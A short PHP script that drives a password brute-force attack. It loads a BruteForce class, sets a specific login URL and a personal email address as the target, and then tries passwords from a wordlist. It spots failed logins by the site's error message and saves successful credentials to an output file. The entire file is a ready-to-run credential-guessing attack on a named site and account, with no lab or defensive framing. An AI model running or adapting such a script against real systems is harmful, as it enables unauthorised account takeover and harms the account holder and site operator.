<?php

 /**
 * @author Robert Byrnes
 * @created 24/01/2021
 **/

require "app/bruteforce.class.php";

BruteForce::init(array(
		'url'         => 'http://envirosample.online/login.manager.php', // URL from the login page.
        'email'       => 'robbyrnes@hotmail.co.uk', // The username in the POST request.
		'password'    => 'password', // The password in the POST request.
		'activity'    => 'login',    // The name of the admin on the login page, in this class is brute-forcing only for the password.
		'wordlist'    => 'wordlist/wordlist.txt', // Path to the wordlist.
		'failcontent' => 'Invalid login information or the account is not activated.', // Content of page when logging in fails.
		'outputfile'  => 'output/output.txt', // Output file where the matching combo('s) will be stored in.
		'timezone'    => 'Europe/Amsterdam' // Time zone for the output file.
	));

$bf = new BruteForce(); // Instatiate the class.
echo $bf->attack(); // Use the attack function.